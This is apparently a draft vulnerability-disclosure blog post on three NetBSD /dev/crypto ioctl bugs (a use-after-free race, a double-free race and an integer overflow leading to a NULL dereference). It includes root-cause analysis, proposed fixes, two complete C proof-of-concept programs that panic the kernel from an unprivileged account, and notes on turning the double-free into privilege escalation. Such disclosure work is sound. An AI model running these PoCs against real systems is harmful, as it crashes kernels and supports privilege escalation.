---
title: "[Netbsd - cryptodev] One integer overflow and plenty of UAF"
tags: ["vr", "vulnerability research", "netbsd", "uaf", "nasm", "pwn", "linux", "kernel", "kernel exploitation", "cryptodev"]
published: 2026-02-06
category: "research"
draft: True
---

# Introduction

The NetBSD `opencrypto` framework provides a standardized interface for kernel-level cryptographic operations, allowing userspace applications to leverage hardware acceleration.
This post breaks down three distinct vulnerabilities discovered in the `ioctl` handling of the crypto operations in `/dev/crypto` reachable from an unpriviledged user. These vulnerabilities were discovered through fuzzing with Syzkaller. These bugs were assigned: CVE-2026-32848 (Session lifecycle race condition → UAF / double-free) and CVE-2026-32849 (Integer handling flaw → NULL pointer dereference). This post is not realeased yet because these bugs are under coordinated disclosure.

### UAF, Double-Free, and NULL Dereference

The vulnerabilities found in `cryptof_ioctl` and `cryptodev_op` highlight a fundamental architectural issue: the lack of proper synchronization between session management and active crypto operations.

* **The Session Lifetime Race (CWE-416):** A race condition between `CIOCCRYPT` (executing an operation) and `CIOCFSESSION` (tearing down a session). Because the global mutex is released prematurely, a session can be freed while it is still being accessed, resulting in a **Use-After-Free**.

* **Concurrent UIO Race:** (linked to the first bug) By storing mutable request state directly within the shared session structure, the kernel fails to protect against multiple threads using the same session ID. This leads to a heap corruption (uaf or double free depending on the window) as threads overwrite each other's allocations.

* **Integer overflow (leading to CWE-476):** A logic error in `cryptodev_op` allows a user-controlled unsigned value to overflow a signed integer. This causes the kernel to bypass critical memory allocations while continuing with data copies, resulting in a **NULL Pointer Dereference** and a system-wide kernel panic.

# Race Condition in `cryptof_ioctl` / `cryptodev_op`: Use-After-Free & Double-Free

## Affected Component

| Field | Value |
|---|---|
| **File** | `sys/opencrypto/cryptodev.c` |
| **Functions** | `cryptof_ioctl()` (`CIOCCRYPT`, `CIOCFSESSION`), `cryptodev_op()` |
| **Type** | CWE-416: Use-After-Free / CWE-415: Double-Free |
| **Impact** | Kernel panic, heap corruption primitive |

## CIOCCRYPT/CIOCFSESSION Session Lifetime Race

`CIOCCRYPT` drops `cryptodev_mtx` after `csefind` but before `cryptodev_op` completes. A concurrent `CIOCFSESSION` (or `cryptof_close`) on another thread can call `csedelete` + `csefree` on the same session in this window, causing `cryptodev_op` to operate on a freed `cse`.
```c
cse = csefind(fcr, cop->ses);
mutex_exit(&cryptodev_mtx);   /* window opens here */
/* concurrent CIOCFSESSION frees cse */
error = cryptodev_op(cse, cop, curlwp);  /* UAF */
```

## Concurrent `cryptodev_op` on the Same Session: `uio` Race

`cse->uio` and `cse->iovec` are stored directly in the `csession` struct. When two threads call `CIOCCRYPT` with the same session ID simultaneously, both enter `cryptodev_op` with the same `cse` pointer and race on:
```c
cse->uio.uio_iov[0].iov_len  = iov_len;
cse->uio.uio_iov[0].iov_base = kmem_alloc(iov_len, KM_SLEEP);  /* both threads allocate */
```

Thread B overwrites the pointer allocated by thread A. Both threads then reach the `bail:` cleanup and free whichever pointer is currently in `cse->uio.uio_iov[0].iov_base`, producing a double-free on one allocation and a leak on the other.
```c
bail:
    if (cse->uio.uio_iov[0].iov_base)
        kmem_free(cse->uio.uio_iov[0].iov_base, iov_len);  /* double-free */
```

## Root Cause

Both bugs share the same underlying cause: `csession` embeds mutable per-operation state (`uio`, `iovec`, `error`) directly in the session struct, and `CIOCCRYPT` provides no per-session serialization after releasing `cryptodev_mtx`.

## Proof of Concept

See attached PoC. `poc_uaf_cioccrypt_race()` races `CIOCCRYPT` against `CIOCFSESSION` to trigger Bug 1. `poc_uio_race()` hammers the same session from 8 threads to trigger Bug 2.

## Fix

- Add a per-`csession` reference count (or rwlock) incremented by `csefind` and decremented after `cryptodev_op` returns, so `csefree` blocks until all in-flight operations complete.
- Move `uio`/`iovec` off the `csession` struct and onto the stack (or a per-call allocation) inside `cryptodev_op` to eliminate the shared mutable state entirely.

```c
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/fcntl.h>
#include <crypto/cryptodev.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <err.h>

static int cryptofd;
static uint32_t shared_ses;
static volatile int stop;

static uint32_t
make_session(int fd)
{
    struct session_op sop;
    uint8_t key[16];

    memset(&sop, 0, sizeof(sop));
    memset(key, 0x41, sizeof(key));
    sop.cipher   = CRYPTO_AES_CBC;
    sop.keylen   = sizeof(key);
    sop.key      = key;

    if (ioctl(fd, CIOCGSESSION, &sop) < 0)
        err(1, "CIOCGSESSION");

    return sop.ses;
}

static void *
thread_crypt(void *arg)
{
    struct crypt_op cop;
    uint8_t src[32], dst[32], iv[16];

    memset(src, 0x41, sizeof(src));
    memset(iv,  0x00, sizeof(iv));

    while (!stop) {
        memset(&cop, 0, sizeof(cop));
        cop.ses = shared_ses;
        cop.op  = COP_ENCRYPT;
        cop.len = sizeof(src);
        cop.src = src;
        cop.dst = dst;
        cop.iv  = iv;
        ioctl(cryptofd, CIOCCRYPT, &cop);
    }
    return NULL;
}

static void *
thread_free(void *arg)
{
    while (!stop) {
        uint32_t ses = shared_ses;
        ioctl(cryptofd, CIOCFSESSION, &ses);
        shared_ses = make_session(cryptofd);
    }
    return NULL;
}

static void
poc_uaf_cioccrypt_race(void)
{
    pthread_t ta, tb;

    printf("[*] PoC 1: CIOCCRYPT/CIOCFSESSION UAF race\n");

    cryptofd = open("/dev/crypto", O_RDWR);
    if (cryptofd < 0)
        err(1, "open /dev/crypto");

    shared_ses = make_session(cryptofd);
    stop = 0;

    pthread_create(&ta, NULL, thread_crypt, NULL);
    pthread_create(&tb, NULL, thread_free,  NULL);

    sleep(5);
    stop = 1;

    pthread_join(ta, NULL);
    pthread_join(tb, NULL);

    close(cryptofd);
    printf("[*] PoC 1 done (check dmesg for KCSAN/panic)\n");
}

#define NTHREADS 8

static uint32_t poc2_ses;
static int      poc2_fd;

static void *
thread_crypt_same_ses(void *arg)
{
    struct crypt_op cop;
    uint8_t src[32], dst[32], iv[16];
    int i;

    memset(src, 0x42, sizeof(src));
    memset(iv,  0x00, sizeof(iv));

    for (i = 0; i < 10000; i++) {
        memset(&cop, 0, sizeof(cop));
        cop.ses = poc2_ses;
        cop.op  = COP_ENCRYPT;
        cop.len = sizeof(src);
        cop.src = src;
        cop.dst = dst;
        cop.iv  = iv;
        ioctl(poc2_fd, CIOCCRYPT, &cop);
    }
    return NULL;
}

static void
poc_uio_race(void)
{
    pthread_t threads[NTHREADS];
    int i;

    printf("[*] PoC 2: concurrent CIOCCRYPT same session (cse->uio race)\n");

    poc2_fd = open("/dev/crypto", O_RDWR);
    if (poc2_fd < 0)
        err(1, "open /dev/crypto");

    poc2_ses = make_session(poc2_fd);

    for (i = 0; i < NTHREADS; i++)
        pthread_create(&threads[i], NULL, thread_crypt_same_ses, NULL);
    for (i = 0; i < NTHREADS; i++)
        pthread_join(threads[i], NULL);

    close(poc2_fd);
    printf("[*] PoC 2 done\n");
}

int
main(void)
{
    poc_uaf_cioccrypt_race();
    poc_uio_race();
    return 0;
}
```
# NULL Pointer Dereference in cryptodev_op

| Field | Value |
|---|---|
| **File** | `sys/opencrypto/cryptodev.c` |
| **Function** | `cryptodev_op()` |
| **Type** | CWE-190: Integer Overflow / CWE-476: NULL Pointer Dereference |
| **Impact** | Kernel panic (DoS) |

## Root Cause

`iov_len` is declared as `int` (signed) but assigned from `cop->dst_len` which is `u_int` (unsigned). When `cop->dst_len > INT_MAX`, the assignment produces a negative value — undefined behavior per the C standard. On x86-64 with `-O2`, the compiler may eliminate the subsequent safety check entirely.

```c
int iov_len = cop->len;           /* signed */
if ((cse->tcomp) && cop->dst_len) {
    if (iov_len < cop->dst_len)
        iov_len = cop->dst_len;   /* UB: u_int -> int, wraps negative */
}
/* size_t <- negative int -> 0xffffffff80000001 */
cse->uio.uio_iov[0].iov_len = iov_len;
/* FALSE or optimized away under -O2 */
if (iov_len > 0)
    cse->uio.uio_iov[0].iov_base = kmem_alloc(iov_len, KM_SLEEP);
/* corrupted: 0xffffffff80000001 */
cse->uio.uio_resid = cse->uio.uio_iov[0].iov_len;
/* iov_base = NULL -> fault */
copyin(cop->src, cse->uio.uio_iov[0].iov_base, cop->len);
```

## Trigger Conditions

| Field | Value |
|---|---|
| **Session type** | Compression session (`CRYPTO_DEFLATE_COMP` or `CRYPTO_GZIP_COMP`) |
| **`cop->dst_len`** | `> INT_MAX` (e.g. `0x80000001`) |
| **`cop->dst_len`** | `> cop->len` to trigger the `iov_len` overwrite path |

Proof-of-concept:
```c
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/fcntl.h>
#include <crypto/cryptodev.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <err.h>

/*
 * PoC: two bugs demonstrated
 *
 * Bug A: iov_len signed overflow → NULL iov_base → copyin NULL ptr
 *   Requires: tcomp session, dst_len > INT_MAX
 *   Effect: copyin(src, NULL, len) → kernel fault
 *
 * Bug B: large iov_len allocation via dst_len, then early bail
 *   via cop->iv on compression-only session (crde==NULL)
 *   Effect: allocates large buffer, bails, frees correctly BUT
 *           the copyin into that large buffer happens BEFORE the
 *           iv check — so we get copyin of 16 bytes into a large
 *           buffer then free it — demonstrates the logic inversion
 *           (should validate iv before allocating)
 */

static int
open_crypto(void)
{
    int fd = open("/dev/crypto", O_RDWR);
    if (fd < 0) err(1, "open /dev/crypto");
    return fd;
}

static uint32_t
make_comp_session(int fd, int alg)
{
    struct session_op sop;
    memset(&sop, 0, sizeof(sop));
    sop.comp_alg = alg;
    if (ioctl(fd, CIOCGSESSION, &sop) < 0)
        err(1, "CIOCGSESSION");
    printf("[*] comp session id=%u alg=%d\n", sop.ses, alg);
    return sop.ses;
}

static uint32_t
make_cipher_session(int fd)
{
    struct session_op sop;
    uint8_t key[16];
    memset(&sop, 0, sizeof(sop));
    memset(key, 0x41, sizeof(key));
    sop.cipher = CRYPTO_AES_CBC;
    sop.keylen = sizeof(key);
    sop.key    = key;
    if (ioctl(fd, CIOCGSESSION, &sop) < 0)
        err(1, "CIOCGSESSION cipher");
    printf("[*] cipher session id=%u\n", sop.ses);
    return sop.ses;
}

/*
 * Bug A: NULL iov_base via signed overflow of iov_len
 *
 * Execution path:
 *   cop->len=16 → iov_len=16
 *   cop->dst_len=0x80000001 → iov_len=0x80000001 (UB, negative as int)
 *   iov_len > 0 → FALSE → iov_base not allocated → NULL
 *   uio_resid = (size_t)(negative) → 0xffffffff80000001
 *   copyin(cop->src, NULL, 16) → fault
 */
static void
bug_a_null_iov_base(void)
{
    int fd = open_crypto();
    uint32_t ses = make_comp_session(fd, CRYPTO_DEFLATE_COMP);

    struct crypt_op cop;
    uint8_t src[16], dst[16];
    memset(src, 0x41, sizeof(src));
    memset(&cop, 0, sizeof(cop));

    cop.ses     = ses;
    cop.op      = COP_COMP;
    cop.len     = 16;
    cop.src     = src;
    cop.dst     = dst;
    cop.dst_len = 0x80000001;   /* > INT_MAX → iov_len goes negative */
    cop.iv      = NULL;
    cop.mac     = NULL;

    printf("[*] Bug A: dst_len=0x%x → iov_len overflow\n", cop.dst_len);
    printf("    expected: copyin to NULL → kernel fault/panic\n");
    if (ioctl(fd, CIOCCRYPT, &cop) < 0)
        warn("    CIOCCRYPT returned error (may have faulted in kernel)");
    else
        printf("    [!] returned OK — check dmesg\n");

    close(fd);
}

int
main(void)
{
    printf("=== cryptodev_op vulnerability PoC ===\n\n");

    printf("--- Bug A: iov_len signed overflow ---\n");
    bug_a_null_iov_base();
    printf("\n");
    return 0;
}
```

## Impact

| Scenario | Description |
|---|---|
| **SVS enabled** | `copyin` faults on NULL `iov_base` — caught by `onfault` table — clean `EFAULT` returned to userspace, no panic. |
| **SVS disabled (KASAN config)** | `copyin` may succeed into a mapped page at `0x0`. UIO machinery consumes the corrupted `uio_resid = 0xffffffff80000001` in pointer arithmetic, producing the non-canonical address `0xfffff9000000000`. This triggers a #GP fault which is *not* handled by the `copyin` `onfault`/`nofault` recovery table (which only covers page faults), resulting in an unrecoverable kernel panic. |


# Environment

Depending on your hardware, it might be needed to set `kern.cryptodevallowsoft=0` (`sysctl -w kern.cryptodevallowsoft=0`), by default cryptodev does not allow software requests (and we do not use software implementations in these bugs) but we still need to create sessions and if netbsd is running on qemu, the hardware accelerators will not be available which won't allow us to create sessions. 

So basically: this should not be an issue on system running on real hardware but we need to modify it if we run netbsd in qemu.  

Here is my environment but the bugs shown above should be reproducible on any Netbsd kernel until a193196bb9d88f0ce1ecaffdaf07fb69ff1de448.
```
syssec@Syssec:~/netbsd/src$ git diff sys/arch/amd64/conf/GENERIC
diff --git a/sys/arch/amd64/conf/GENERIC b/sys/arch/amd64/conf/GENERIC
index 0fedb047c3e0..a9d86a097a76 100644
--- a/sys/arch/amd64/conf/GENERIC
+++ b/sys/arch/amd64/conf/GENERIC
@@ -166,8 +166,8 @@ options     KDTRACE_HOOKS   # kernel DTrace hooks
 #options       KMSAN_PANIC     # optional
 
 # Kernel Code Coverage Driver.
-#makeoptions   KCOV=1
-#options       KCOV
+makeoptions    KCOV=1
+options        KCOV
 
 # Fault Injection Driver.
 #options       FAULT
@@ -959,7 +959,7 @@ urlphy* at mii? phy ?                       # Realtek RTL8150L internal PHYs
 # USB Controller and Devices
 
 # Virtual USB controller
-#pseudo-device vhci
+pseudo-device  vhci
 
 # PCI USB controllers
 xhci*  at pci? dev ? function ?        # eXtensible Host Controller
@@ -979,7 +979,7 @@ uhci*       at cardbus? function ?          # Universal Host Controller (Intel)
 slhci* at pcmcia? function ?           # ScanLogic SL811HS
 
 # USB bus support
-#usb*  at vhci?
+usb*   at vhci?
 usb*   at xhci?
 usb*   at ehci?
 usb*   at ohci?
syssec@Syssec:~/netbsd/src$ git status | head
On branch trunk
Your branch is up to date with 'origin/trunk'.
...
syssec@Syssec:~/netbsd/src$ git log | head
commit a193196bb9d88f0ce1ecaffdaf07fb69ff1de448
Author: christos <christos@NetBSD.org>
Date:   Sun Mar 8 21:07:26 2026 +0000

    new tzcode
```

# Exploitability

Now that we've been through the root cause analysis of the vulnerabilities we migh wonder how epxloitable this is, and to be honest I am not sure yet of the answer. The most interesting primitive seems to be the race on `uio`, if thread A provides a very large `iov_len` and that thread B races on the `uio` buffer with a small `iov_len` value it provides a large heap overflow primitive bug:
```c
cse->uio.uio_iov[0].iov_len = iov_len;
if (iov_len > 0)
    cse->uio.uio_iov[0].iov_base = kmem_alloc(iov_len, KM_SLEEP); 
// thread A already allocated a buf of size N and thread B allocates a buf of size N-0x1000
cse->uio.uio_resid = cse->uio.uio_iov[0].iov_len;
DPRINTF("lid[%u]: uio.iov_base %p malloced %d bytes\n",
    CRYPTO_SESID2LID(cse->sid),
    cse->uio.uio_iov[0].iov_base, iov_len);

crp = crypto_getreq((cse->tcomp != NULL) + (cse->txform != NULL) + (cse->thash != NULL));
if (crp == NULL) {
    error = ENOMEM;
    goto bail;
}
DPRINTF("lid[%u]: crp %p\n", CRYPTO_SESID2LID(cse->sid), crp);

if (cse->tcomp) {
    crdc = crp->crp_desc;
}

if (cse->thash) {
    crda = crdc ? crdc->crd_next : crp->crp_desc;
    if (cse->txform && crda)
        crde = crda->crd_next;
} else {
    if (cse->txform) {
        crde = crdc ? crdc->crd_next : crp->crp_desc;
    } else if (!cse->tcomp) {
        error = EINVAL;
        goto bail;
    }
}

DPRINTF("ocf[%u]: iov_len %zu, cop->len %u\n",
        CRYPTO_SESID2LID(cse->sid),
        cse->uio.uio_iov[0].iov_len, 
        cop->len);

// If thread B manages to overwrite cse->uio.uio_iov[0].iov_base before reaching this copyin, the heap overflow primitive is possible
// leading to a large heap overflow from thread A which is using the large cop->len on a small overwritten iov_base
if ((error = copyin(cop->src, cse->uio.uio_iov[0].iov_base, cop->len)))
{
    printf("copyin failed %s %d \n", (char *)cop->src, error);
    goto bail;
}
```

That's the first exploitation idea I had but the race is a little bit tricky. A larger window would be to just reach the end of the `cryptodev_op` function to trigger the double free primitive:
```c
	if (cse->uio.uio_iov[0].iov_base) {
		kmem_free(cse->uio.uio_iov[0].iov_base,iov_len);
	}
```

This will reliably lead to a double free with a very flexible size range (from 1 to 256*1024-4 bytes), from there we just need to find interesting objects to spray and to corrupt to achieve a clean privilege escalation. But I will explore this in another blogpost!

> Cet objet d’expérience [Erfahrungsmäßige] est la décision et l’acte [der Entschluß und die That] qui s’étendent au-delà du monde; car tout ce qui est susceptible d’expérience provient seulement de la décision et de l’acte. Ils sont la fondation dernière de toutes choses [die lezte Begrün-dung von allem].

(Schelling 1827/28, 75)